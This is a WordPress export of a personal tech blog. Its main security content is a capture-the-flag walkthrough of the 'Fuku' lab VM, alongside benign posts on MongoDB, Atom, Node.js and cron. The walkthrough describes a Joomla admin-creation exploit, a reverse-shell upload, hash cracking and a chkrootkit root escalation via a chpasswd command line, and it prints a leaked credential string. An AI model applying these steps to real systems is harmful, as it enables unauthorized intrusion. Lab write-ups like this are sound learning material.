		</wp:postmeta>
	</item>
	<item>
		<title>Hacking - The art of exploitation</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/?p=1519</link>
		<pubDate>Mon, 30 Nov -0001 00:00:00 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1519</guid>
		<description></description>
		<content:encoded><![CDATA[So I have taken a little break from breaking VM:s to relax and read some books instead. So I started out with Hacking - The Art of Exploitation by Jon Erickson.

1 Introduction

2. Programming
Not that interesting for anyone who has programmed before.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1519</wp:post_id>
		<wp:post_date>2016-05-15 17:24:20</wp:post_date>
		<wp:post_date_gmt>0000-00-00 00:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name></wp:post_name>
		<wp:status>draft</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
	</item>
	<item>
		<title>Walkthrough Fuku</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/05/24/walkthrough-fuku/</link>
		<pubDate>Tue, 24 May 2016 02:58:18 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1537</guid>
		<description></description>
		<content:encoded><![CDATA[I have just finished another VM. The very annoying, but fun, machine called Fuku. As in Fuck you, I guess. It was designed to really mess with the challenger.

Okay, so let's get started.

So after scanning the machine I saw that all ports were open. But only ssh port 22 was a real service. I tried a few basic password on it, but I got blocket pretty fast. I am guessing some fail2ban serivce. The rest of the ports just outputed a FUKU note. So they were just false positives. So I wrote a python-script to try out every port possible. But that wasn't easy. First I wrote it to check for the return-length. But that didn't return anything. So that we quite annoying. And I also added multithread to be able to check the ports faster:
[code]
from multiprocessing.dummy import Pool as ThreadPool
pool = ThreadPool(2)
results = pool.map(testPorts, minArr)
[/code]
SO then I had to rewrite the script to make a get-request instead. Anyhow, I found the joomla service on port 13370 after a lot of work. And I ran joomscan on it and found a lot of vulnerabilities. Especially a vulnerability that creates a admin-user for you. So I did that. Here is the exploit I used: https://www.exploit-db.com/exploits/6234/

The page was in japanese, but it wasn't that hard to create the admin-user. But once I was in it was really difficult to understand what was going on. I though I changed the language so many times. And I tried to change it. At one point I thought english had been removed completely just for the sake of FUKU. But in the end I found it.

Then came the next challenge. How to upload a shell. I tried to turn off all forms of editors to be able to insert php, but nothing worked. So I tried to enable ftp, but that didn't work since that port was already in use. I tried to upload a shell through the media-uploads, but that blocked the code. So after some heacy googeling on how to run php I ended up installning the DirectPhp-plugin. This one: http://www.kksou.com/php-gtk2/joomla/directphp-plugin.php#download

So I uploaded my reverse-shell and got in. 

The first thing I wanted to do was to spawn a shell: 

[code]
$ python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
haha! FUKU! Only root can run that command.
[/code]
That together with a few other commands was blocked. And since I couldn't get a tty-shell I was unable to use sudo and su. 

So I started to mess around with the mysql-database. Which was quite difficult without a tty-shell. It was really buggy. Oh yeah, I found the mysql-login credencials in configuration.php in /var/www/html. So I looked around in the databse fuku and found gizmos user. So I got the hash and cracked it with hashcat. 

[code]
hashcat -m 11 -a 0 -o found.txt admin.hash /usr/share/hashcat/rules/rockyou-30000.rule
[/code]
Only to find that gizmo used the same password to his user as for the database. sillyboy. So that was not so useful. There was also another admin-user and a admin-account in tacacs. "admin	ht70zyjHsMl3A".

So I transfered my enumeration-script and started enumerating. I found that it was a ubuntu-15.04 machine. So I figured to could try the standard overlay-exploits that work on quite a few ubuntus. But gcc was somehow blocked. 
[code]
www-data@Fuku:/tmp$ gcc exp.c -o exp
gcc exp.c -o exp
haha! FUKU! Only root can run that command.

[/code]
So I compiled the the exploit on my machine and then did a wget to transfer it. But it wouldn't run since www-data lacked certain rights.

Then I got stuck for quite some time. ANd I cheated a bit, just to read the words chrootkit. So I found that program running and I looked for an exploit for it. And found this: https://www.exploit-db.com/exploits/33899/
Pretty crazy exploit. A incredible priv-esc exploit from a program that attempts to stop rootkits. So after a few trial and error with using the exploit I finally just wrote: [code]
echo &quot;echo root:adminadmin | chpasswd&quot; &gt; update
[/code]
And then I logged in using ssh. But that was after going a bit crazy in trying to get a tty-shell for www-data. So that was it. I got root and the flag. 

[code]
Yep, this is a flag. It's worth over 9000 Internet points!
Random keyboard smash: lkhI6u%RdFEtDjJKIuuiI7i&amp;*iuGf)8$d4gfh%4
[/code]

In the root-folder was all the programs and rools that I was blocked from using. 

[code]
19700101      chkrootkit-0.49  flag.txt  g++-4.9  gcc-4.9  gcc-ar-4.9  gcc-nm-4.9  gcc-ranlib-4.9  ifconfig  mlocate    python     uname  whoami
change_ip.sh  cpp-4.9          fuku      gcc      gcc-ar   gcc-nm      gcc-ranlib  id              locate    portspoof  python2.7  which
[/code]
<h3>Conclusion</h3>
I spent a lot of time writing the python-script. So that was a good learning-experience. Finding the chrootkit-was probably the hardest. I should have seen that it was a unusual service. All in all a really fun challenge! Thanks https://www.vulnhub.com/author/robert-winkel,190/ Robert Winkel for the machine! Frustrating but fun!
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1537</wp:post_id>
		<wp:post_date>2016-05-24 02:58:18</wp:post_date>
		<wp:post_date_gmt>2016-05-24 02:58:18</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>walkthrough-fuku</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="ctf"><![CDATA[CTF]]></category>
		<category domain="post_tag" nicename="pen-testing"><![CDATA[pen-testing]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<category domain="post_tag" nicename="vulnhub"><![CDATA[vulnhub]]></category>
		<category domain="post_tag" nicename="wargames"><![CDATA[wargames]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[23117975535]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Print out field from MongoDB and save in file</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/06/13/print-out-field-from-mongodb-and-save-in-file/</link>
		<pubDate>Mon, 13 Jun 2016 17:16:19 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1598</guid>
		<description></description>
		<content:encoded><![CDATA[Today I encountered a fun little problem. I had to run through a database and print out every single field of the query and save it in a text document.

So I ended up doing it like this.

First I wrote a script that looks like this:


[code lang="javascript"]
//script.js
db.collection.find({active: true}).forEach(
    function(x) {
        print(x.id); 
    } 
);`
[/code]

Then I ran the script like this:

`mongo databaseName script.js | sed -n -e '1,1000p' &gt; testing.txt`

I added the sed-command to print out the first 1000 lines. This approach worked out well, and I can add sort and uniq if I need that.

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1598</wp:post_id>
		<wp:post_date>2016-06-13 17:16:19</wp:post_date>
		<wp:post_date_gmt>2016-06-13 17:16:19</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>print-out-field-from-mongodb-and-save-in-file</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="mongodb"><![CDATA[mongodb]]></category>
		<category domain="post_tag" nicename="script"><![CDATA[script]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[23796859731]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Atom plugins and configs</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/07/08/list-of-my-favorite-atom-plugins/</link>
		<pubDate>Fri, 08 Jul 2016 16:58:51 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1617</guid>
		<description></description>
		<content:encoded><![CDATA[
Plugins
- Minimap
Show a minimap.
- file-icons
Show nice file-icons in the file-tree.
- <a href="https://atom.io/packages/merge-conflicts">merge-conflicts</a>
Show git merge-conflicts in a more intuitive way.
- keyboard-localization
If you have a non-english keyboard.
- react
Show react-syntax.
- pigments
- <a href="https://atom.io/packages/multi-cursor-plus">multi-cursor-plus</a>
This is a great plugin. For the times you want to use multiple cursors but now exactly below each other. It requires a copy-paste configuration.
- <a href="https://atom.io/packages/color-picker">color-picker</a>
Makes it a bit easier to select colors for your css
- linter
To automatically check the code.
- linter-jshint
For linter to work on JS
Here is a list of other languages <a href="https://atomlinter.github.io/">languages</a>
- linter-markdown
- atom-terminal
this plugin let's you run ctr-alt-t in any file, and a terminal will open up in that directory

Themes
atom-material-ui
Syntax
atom-material-syntax

This can be done fast with the atom package manager

[code]apm install minimap file-icons merge-conflicts keyboard-localization react pigments multi-cursor-plus color-picker linter linter-jshint atom-material-syntax atom-material-ui atom-terminal[/code]

Paste in this in your keymap.json file to get the comment function to work correctly.
[code]
'atom-workspace atom-text-editor:not([mini])':
  'ctrl-7': 'editor:toggle-line-comments'
[/code]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1617</wp:post_id>
		<wp:post_date>2016-07-08 16:58:51</wp:post_date>
		<wp:post_date_gmt>2016-07-08 16:58:51</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>list-of-my-favorite-atom-plugins</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[24596769897]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>CPU-intensive operations in NodeJS</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/07/22/cpu-intensive-operations-in-nodejs/</link>
		<pubDate>Fri, 22 Jul 2016 13:46:44 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1681</guid>
		<description></description>
		<content:encoded><![CDATA[Lately I have been learning about CPU-intensive operations and I/O-intensive operations. The problem I have run into has been: how do I handle long-running tasks in the routes/endpoints. Let's say that you have a million items you want to show the user, so and you have to iterate over all the items and edit them in some way. Wait, that a crappy example, let's instead say that you have a ton of statistics and you want to give the user a real-time analysis of that statistics. That is going to take a lot of time. If that happens right in the endpoint that request is going to block the node-server until the process is finished. That's because of the single-threadedness of node (<a href="https://www.youtube.com/watch?v=8aGhZQkoFbQ">Yada yada this presentation is still the best thing on the internet to explain nodes event-loop.</a>). This means that all other users have to wait for that request to finish.

While I read about this I came across a few concepts that are useful to know.
<h2>CPU-bound</h2>
This can sometimes be called: long running CPU tasks, CPU intensive tasks or
CPU-bound tasks.

A program/application/process that is CPU-bound is something that requires a lot of CPU-power. CPU-power is usually needed when doing a lot of calculations.

<h2>I/O-bound</h2>
An application that is I/O-bound is mostly wait for network or database. This is something that Nodejs does really good. Since it can process several requests while it is waiting for a response from the database. That's why node can be so fast in servering many requests.


<h2>Different Server</h2>
So there are conceptually some different servers. One being a web-server.
A web-server is basically a I/O-bound server. The main focus is to server requests as fast as possible. That mean that if you have an operation that is CPU-bound is does not belong in the Web-server. That process probably belongs better in a worker-server.

<h2>Possible solutions for CPU-bound operations in a NodeJs-server</h2>
Okay, so how to we solve the problem of doing CPU-bound operations on a NodeJS application?

Here are some of the alternatives I have run into while researching this. This list is not exhaustive, and it might not even be correct (I have just been googeling around a bit, I'm no expert).

<ul>

<li>
1. "Offline"-server dedicated to processing data
You can have a server that process the data offline, in the sense that it is not in real-time.
A. Cron-job
Having a cron-job that calculates on a schedule. For example every half hour or something like that. This is of course very resource consuming. What if nothing has happened and the server process the data again? That would be very unnecessary.

B. Only calculate when an update in the database is done. This could be achieved by having a message sent every time the database gets updated.

C. Do part of the calculation when an update to the database is done. But only process the data since the last process. If this is possible.

There is a pretty good answer on <a href="http://programmers.stackexchange.com/questions/158781/cpu-heavy-web-server">SO about this.</a>
</li>

<li>
2. Separate server do the CPU-crunching.
Have a separte server do the number crunching. And then just connect the web-server to that endpoint. Since the request is async, other requests will work meanwhile. Since node can work while waiting for a callback.

Here is a <a href="http://davidherron.com/blog/2014-07-03/easily-offload-your-cpu-intensive-nodejs-code-simple-express-based-rest-server">blog-post discussing this.</a> 
</li>

<li>
3. Using Nodes ClusterModule -- Clusters - LoadBalancer with separate processes

https://www.sitepoint.com/how-to-create-a-node-js-cluster-for-speeding-up-your-apps/

</li>

<li>
4. Rabbit queue message

</li>

<li>
5. process.NextTick/setImmediate
If you know what you are doing and you really want the operation to happen on your web-server. This can be a way.
This trick can make synchronous operations asynchronous. So that the server can attend other easier tasks meanwhile. This is <a href="http://neilk.net/blog/2013/04/30/why-you-should-use-nodejs-for-CPU-bound-tasks/">blog </a>exemplified it pretty well. 


http://bytearcher.com/articles/io-vs-cpu-bound/?utm_source=hashnode.com
http://stackoverflow.com/questions/3491811/node-js-and-cpu-intensive-requests?rq=1
http://stackoverflow.com/questions/16974557/why-is-node-js-not-suitable-for-heavy-cpu-apps?noredirect=1&amp;lq=1
http://programmers.stackexchange.com/questions/158781/cpu-heavy-web-server
https://www.toptal.com/nodejs/top-10-common-nodejs-developer-mistakes
http://neilk.net/blog/2013/04/30/why-you-should-use-nodejs-for-CPU-bound-tasks/
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1681</wp:post_id>
		<wp:post_date>2016-07-22 13:46:44</wp:post_date>
		<wp:post_date_gmt>2016-07-22 13:46:44</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>cpu-intensive-operations-in-nodejs</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1959580]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_8fa4285aae118b222d1ca07dd83e8760</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_754ad6998c5febdbd030fc6e7ef0613e</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_ded7199782ba9638c103f2dfdfd9aaf7</wp:meta_key>
			<wp:meta_value><![CDATA[<div class="embed-sitepoint"><blockquote class="wp-embedded-content"><a href="https://www.sitepoint.com/how-to-create-a-node-js-cluster-for-speeding-up-your-apps/">How to Create a Node.js Cluster for Speeding Up Your Apps</a></blockquote><script type='text/javascript'><!--//--><![CDATA[//><!--		!function(a,b){"use strict";function c(){if(!e){e=!0;var a,c,d,f,g=-1!==navigator.appVersion.indexOf("MSIE 10"),h=!!navigator.userAgent.match(/Trident.*rv:11./),i=b.querySelectorAll("iframe.wp-embedded-content"),j=b.querySelectorAll("blockquote.wp-embedded-content");for(c=0;c<j.length;c++)j[c].style.display="none";for(c=0;c<i.length;c++)if(d=i[c],d.style.display="",!d.getAttribute("data-secret")){if(f=Math.random().toString(36).substr(2,10),d.src+="#?secret="+f,d.setAttribute("data-secret",f),g||h)a=d.cloneNode(!0),a.removeAttribute("security"),d.parentNode.replaceChild(a,d)}else;}}var d=!1,e=!1;if(b.querySelector)if(a.addEventListener)d=!0;if(a.wp=a.wp||{},!a.wp.receiveEmbedMessage)if(a.wp.receiveEmbedMessage=function(c){var d=c.data;if(d.secret||d.message||d.value)if(!/[^a-zA-Z0-9]/.test(d.secret)){var e,f,g,h,i,j=b.querySelectorAll('iframe[data-secret="'+d.secret+'"]'),k=b.querySelectorAll('blockquote[data-secret="'+d.secret+'"]');for(e=0;e<k.length;e++)k[e].style.display="none";for(e=0;e<j.length;e++)if(f=j[e],c.source===f.contentWindow){if(f.style.display="","height"===d.message){if(g=parseInt(d.value,10),g>1e3)g=1e3;else if(200>~~g)g=200;f.height=g}if("link"===d.message)if(h=b.createElement("a"),i=b.createElement("a"),h.href=f.getAttribute("src"),i.href=d.value,i.host===h.host)if(b.activeElement===f)a.top.location.href=d.value}else;}},d)a.addEventListener("message",a.wp.receiveEmbedMessage,!1),b.addEventListener("DOMContentLoaded",c,!1),a.addEventListener("load",c,!1)}(window,document);//--><!]]]]><![CDATA[></script><iframe sandbox="allow-scripts" security="restricted" src="https://www.sitepoint.com/how-to-create-a-node-js-cluster-for-speeding-up-your-apps/embed/" width="600" height="338" title="Embedded WordPress Post" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"></iframe></div>]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_time_ded7199782ba9638c103f2dfdfd9aaf7</wp:meta_key>
			<wp:meta_value><![CDATA[1469136074]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_868d35feffb79647c43bcd812bc867bb</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_c5e01c5829fe8d5618fed65bf87557f4</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_4d286495fab0546a994f09102a58035f</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_03985034ab305d7dd0cf34e4c4c67ae8</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_c0b3729ce40f80baf320a583dacd3b12</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_513232c7a9e90605cab9ad3321ae9d1a</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_27d47e54ecf0cb32533ced389950aafe</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_0878593a755d108c528d8e47f30dfe50</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_a16bd23cd10b7560b5434bc054fc4604</wp:meta_key>
			<wp:meta_value><![CDATA[<div class="embed-sitepoint"><blockquote class="wp-embedded-content"><a href="https://www.sitepoint.com/how-to-create-a-node-js-cluster-for-speeding-up-your-apps/">How to Create a Node.js Cluster for Speeding Up Your Apps</a></blockquote><script type='text/javascript'><!--//--><![CDATA[//><!--		!function(a,b){"use strict";function c(){if(!e){e=!0;var a,c,d,f,g=-1!==navigator.appVersion.indexOf("MSIE 10"),h=!!navigator.userAgent.match(/Trident.*rv:11./),i=b.querySelectorAll("iframe.wp-embedded-content"),j=b.querySelectorAll("blockquote.wp-embedded-content");for(c=0;c<j.length;c++)j[c].style.display="none";for(c=0;c<i.length;c++)if(d=i[c],d.style.display="",!d.getAttribute("data-secret")){if(f=Math.random().toString(36).substr(2,10),d.src+="#?secret="+f,d.setAttribute("data-secret",f),g||h)a=d.cloneNode(!0),a.removeAttribute("security"),d.parentNode.replaceChild(a,d)}else;}}var d=!1,e=!1;if(b.querySelector)if(a.addEventListener)d=!0;if(a.wp=a.wp||{},!a.wp.receiveEmbedMessage)if(a.wp.receiveEmbedMessage=function(c){var d=c.data;if(d.secret||d.message||d.value)if(!/[^a-zA-Z0-9]/.test(d.secret)){var e,f,g,h,i,j=b.querySelectorAll('iframe[data-secret="'+d.secret+'"]'),k=b.querySelectorAll('blockquote[data-secret="'+d.secret+'"]');for(e=0;e<k.length;e++)k[e].style.display="none";for(e=0;e<j.length;e++)if(f=j[e],c.source===f.contentWindow){if(f.style.display="","height"===d.message){if(g=parseInt(d.value,10),g>1e3)g=1e3;else if(200>~~g)g=200;f.height=g}if("link"===d.message)if(h=b.createElement("a"),i=b.createElement("a"),h.href=f.getAttribute("src"),i.href=d.value,i.host===h.host)if(b.activeElement===f)a.top.location.href=d.value}else;}},d)a.addEventListener("message",a.wp.receiveEmbedMessage,!1),b.addEventListener("DOMContentLoaded",c,!1),a.addEventListener("load",c,!1)}(window,document);//--><!]]]]><![CDATA[></script><iframe sandbox="allow-scripts" security="restricted" src="https://www.sitepoint.com/how-to-create-a-node-js-cluster-for-speeding-up-your-apps/embed/" width="600" height="338" title="Embedded WordPress Post" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"></iframe></div>]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_d94b6466b12703af4cac470b747ab0ed</wp:meta_key>
			<wp:meta_value><![CDATA[<div class="embed-sitepoint"><blockquote class="wp-embedded-content"><a href="https://www.sitepoint.com/how-to-create-a-node-js-cluster-for-speeding-up-your-apps/">How to Create a Node.js Cluster for Speeding Up Your Apps</a></blockquote><script type='text/javascript'><!--//--><![CDATA[//><!--		!function(a,b){"use strict";function c(){if(!e){e=!0;var a,c,d,f,g=-1!==navigator.appVersion.indexOf("MSIE 10"),h=!!navigator.userAgent.match(/Trident.*rv:11./),i=b.querySelectorAll("iframe.wp-embedded-content"),j=b.querySelectorAll("blockquote.wp-embedded-content");for(c=0;c<j.length;c++)j[c].style.display="none";for(c=0;c<i.length;c++)if(d=i[c],d.style.display="",!d.getAttribute("data-secret")){if(f=Math.random().toString(36).substr(2,10),d.src+="#?secret="+f,d.setAttribute("data-secret",f),g||h)a=d.cloneNode(!0),a.removeAttribute("security"),d.parentNode.replaceChild(a,d)}else;}}var d=!1,e=!1;if(b.querySelector)if(a.addEventListener)d=!0;if(a.wp=a.wp||{},!a.wp.receiveEmbedMessage)if(a.wp.receiveEmbedMessage=function(c){var d=c.data;if(d.secret||d.message||d.value)if(!/[^a-zA-Z0-9]/.test(d.secret)){var e,f,g,h,i,j=b.querySelectorAll('iframe[data-secret="'+d.secret+'"]'),k=b.querySelectorAll('blockquote[data-secret="'+d.secret+'"]');for(e=0;e<k.length;e++)k[e].style.display="none";for(e=0;e<j.length;e++)if(f=j[e],c.source===f.contentWindow){if(f.style.display="","height"===d.message){if(g=parseInt(d.value,10),g>1e3)g=1e3;else if(200>~~g)g=200;f.height=g}if("link"===d.message)if(h=b.createElement("a"),i=b.createElement("a"),h.href=f.getAttribute("src"),i.href=d.value,i.host===h.host)if(b.activeElement===f)a.top.location.href=d.value}else;}},d)a.addEventListener("message",a.wp.receiveEmbedMessage,!1),b.addEventListener("DOMContentLoaded",c,!1),a.addEventListener("load",c,!1)}(window,document);//--><!]]]]><![CDATA[></script><iframe sandbox="allow-scripts" security="restricted" src="https://www.sitepoint.com/how-to-create-a-node-js-cluster-for-speeding-up-your-apps/embed/" width="500" height="282" title="Embedded WordPress Post" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"></iframe></div>]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_time_d94b6466b12703af4cac470b747ab0ed</wp:meta_key>
			<wp:meta_value><![CDATA[1469195208]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_03c632a070440b4ae0b4e25c22a3a7de</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_0e1b1141b93359f5e5bfd2c3819cb814</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_01f16a46935d24f4865468b4573cefd0</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_62353862461d0191c613136f7e266087</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[25046936229]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_3956c49e293129d7c1ad5dc2f0af4f74</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_time_a16bd23cd10b7560b5434bc054fc4604</wp:meta_key>
			<wp:meta_value><![CDATA[1469195213]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_374ee90f1c32dbc5bb1b10e9b4446719</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_02a6e331faa86b91cee9685498379883</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_953ac011596f7b4dce9e83fb364cb2e3</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_0505cd98bad14e677874fefcfb63e98e</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_00384edf58a66944d737db93624a36ec</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_6894d331a4a82185e988137d2bb01505</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Cronjob in Linux</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/07/25/cronjob-in-linux/</link>
		<pubDate>Mon, 25 Jul 2016 20:26:57 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1774</guid>
		<description></description>
		<content:encoded><![CDATA[
To create a cronjob on a linux-machine you just run 

[code]
#The -e flag stands for edit
crontab -e

#The -l flag lists the cronjobs
crontab -l 
[/code]

So I added my cronjob like this and program it to run every minute:

[code]
* * * * * /home/user/cron/script.sh
[/code]
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1774</wp:post_id>
		<wp:post_date>2016-07-25 20:26:57</wp:post_date>
		<wp:post_date_gmt>2016-07-25 20:26:57</wp:post_date_gmt>
